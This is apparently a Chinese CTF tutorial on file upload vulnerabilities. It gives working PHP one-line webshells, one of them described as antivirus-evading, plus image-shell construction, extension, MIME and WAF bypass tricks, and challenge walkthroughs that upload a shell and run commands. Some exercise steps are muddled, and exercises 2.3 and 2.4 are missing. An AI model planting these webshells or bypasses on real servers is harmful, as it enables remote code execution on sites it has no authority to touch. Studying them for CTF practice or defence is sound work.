## 一、文件上传漏洞综合利用方法

### 1.1 利用流程总结

```
完整利用流程：
  1. 分析上传功能
     - 前端验证：禁用JS或修改请求
     - 后端验证：分析验证方式
  
  2. 尝试绕过方法
     - 扩展名绕过：大小写、双扩展名、特殊字符
     - MIME类型绕过：修改Content-Type
     - 文件内容绕过：图片马、修改文件头
     - 解析漏洞利用：Apache、IIS、Nginx
  
  3. 上传恶意文件
     - PHP WebShell
     - 图片马
     - 其他恶意文件
  
  4. 执行代码
     - 直接访问文件
     - 文件包含漏洞
     - 解析漏洞
  
  5. 获取Flag
     - 执行命令读取Flag
     - 查看网页内容
```

### 1.2 常用WebShell代码

```
PHP WebShell：
  1. 一句话木马：
     <?php @eval($_POST['cmd']); ?>
     <?php system($_POST['cmd']); ?>
     <?php passthru($_POST['cmd']); ?>
  
  2. 带密码的WebShell：
     <?php if($_POST['pass']=='123'){@eval($_POST['cmd']);} ?>
  
  3. 免杀WebShell：
     <?php $a=$_POST['a'];$b=$_POST['b'];@eval($a.$b); ?>
  
  4. 图片马：
     在图片文件末尾添加PHP代码
     使用copy命令合并：copy /b image.jpg + shell.php webshell.jpg
  
使用方法：
  通过POST参数cmd执行命令
  使用Burp或菜刀等工具连接
```

### 1.3 常见绕过技巧总结

```
绕过技巧汇总：
  1. 扩展名绕过：
     - 大小写混淆：.PhP、.pHp
     - 双扩展名：.php.jpg、.php.gif
     - 特殊字符：.php.、.php_、.php%00.jpg
     - 利用解析漏洞：.php5、.phtml
  
  2. MIME类型绕过：
     - 修改Content-Type为image/jpeg等
     - 伪造MIME类型
  
  3. 文件内容绕过：
     - 添加正确的文件头
     - 使用图片马
  
  4. 路径遍历绕过：
     - 如果文件名可控，尝试路径遍历
```

## 二、CTF题目实战练习

### 2.1 练习1：前端验证绕过

```
题目描述：
  网站有一个头像上传功能
  前端使用JavaScript验证文件类型
  只允许上传jpg、png、gif文件
  后端没有额外验证

解题步骤：
  1. 分析验证方式：
     - 查看页面源代码，找到验证逻辑
     - 发现是前端验证
  
  2. 准备WebShell：
     创建shell.php文件：<?php @eval($_POST['cmd']); ?>
  
  3. 禁用JavaScript或修改请求：
     方法1：在浏览器中禁用JavaScript
     方法2：使用Burp抓包修改请求
  
  4. 使用Burp抓包：
     拦截上传请求
     修改文件名从shell.php改为shell.jpg
     修改Content-Type为image/jpeg
  
  5. 发送请求：
     文件被成功上传
  
  6. 访问文件：
     http://example.com/uploads/shell.jpg
  
  7. 执行命令：
     使用Burp发送POST请求，参数cmd=system('cat /flag');
  
  获取Flag：
  flag{frontend_validation_bypass}
```

### 2.2 练习2：后端扩展名验证绕过

```
题目描述：
  后端验证文件扩展名
  只允许jpg、png、gif文件
  使用白名单验证

解题步骤：
  1. 分析验证方式：
     后端使用白名单验证文件扩展名
  
  2. 尝试绕过方法：
     - 大小写混淆：shell.PhP（可能被转换为小写）
     - 双扩展名：shell.php.jpg（需要解析漏洞）
     - 特殊字符：shell.php.（某些服务器会去掉末尾的点）
     - 利用解析漏洞：shell.php5（如果服务器支持）
  
  3. 测试大小写混淆：
     上传shell.PhP，可能被转换为shell.php
  
  4. 测试双扩展名：
     上传shell.php.jpg
     如果服务器存在Apache解析漏洞，会解析为PHP文件
  
  5. 测试特殊字符：
     上传shell.php.
     某些服务器会自动去掉末尾的点
  
  6. 获取Flag：
     如果上传成功，访问文件执行命令
  
  预期结果：
     flag{extension_bypass}
```

### 2.5 练习5：Apache解析漏洞利用

```
题目描述：
  服务器使用Apache
  存在解析漏洞
  只允许上传jpg、png、gif文件

解题步骤：
  1. 分析服务器：
     确定是Apache服务器
     存在解析漏洞
  
  2. 准备恶意文件：
     创建shell.php.xxx文件
     Apache会从右到左解析扩展名
     .xxx无法识别，继续向左解析
     找到.php，解析为PHP文件
  
  3. 上传文件：
     文件名为shell.php.xxx
     扩展名.xxx不在白名单中？
  
  4. 调整策略：
     使用双扩展名：shell.php.jpg
     如果服务器存在解析漏洞，会解析为PHP文件
  
  5. 上传文件：
     文件名为shell.php.jpg
     扩展名.jpg在白名单中，允许上传
  
  6. 访问文件：
     http://example.com/uploads/shell.php.jpg
     Apache解析为PHP文件，执行代码
  
  7. 获取Flag：
     flag{apache_parse_vulnerability}
```

## 三、常见问题解决

### 3.1 问题1：文件上传成功但无法执行

```
现象：
  文件上传成功，但访问时显示为纯文本或图片
  
解决方法：
  1. 检查服务器是否解析该扩展名
  2. 尝试使用不同的扩展名（.php5、.phtml）
  3. 寻找文件包含漏洞
  4. 利用解析漏洞
  
示例：
  如果上传的shell.php.jpg显示为图片
  尝试访问shell.php.jpg/.php（Nginx漏洞）
```

### 3.2 问题2：文件名被修改

```
现象：
  上传后文件名被服务器修改（如添加随机字符串）
  
解决方法：
  1. 寻找文件存储路径
  2. 如果路径可预测，可以尝试暴力破解文件名
  3. 如果路径不可预测，需要其他漏洞配合
  
示例：
  如果服务器使用md5(uniqid())作为文件名
  可以尝试暴力破解可能的文件名
```

### 3.3 问题3：上传目录不可访问

```
现象：
  文件上传成功，但无法通过Web访问
  
解决方法：
  1. 寻找其他漏洞（如文件包含）
  2. 如果服务器允许目录遍历，可以尝试访问
  3. 使用绝对路径访问
  
示例：
  如果上传到非Web目录，可以尝试文件包含漏洞读取文件内容
```

### 3.4 问题4：被WAF拦截

```
现象：
  上传请求被WAF拦截
  
解决方法：
  1. 修改文件名（大小写、特殊字符）
  2. 修改Content-Type
  3. 分块上传（如果支持）
  4. 使用图片马
  5. 使用编码绕过
  
示例：
  将shell.php改为shell.PHP或shell.php_
```
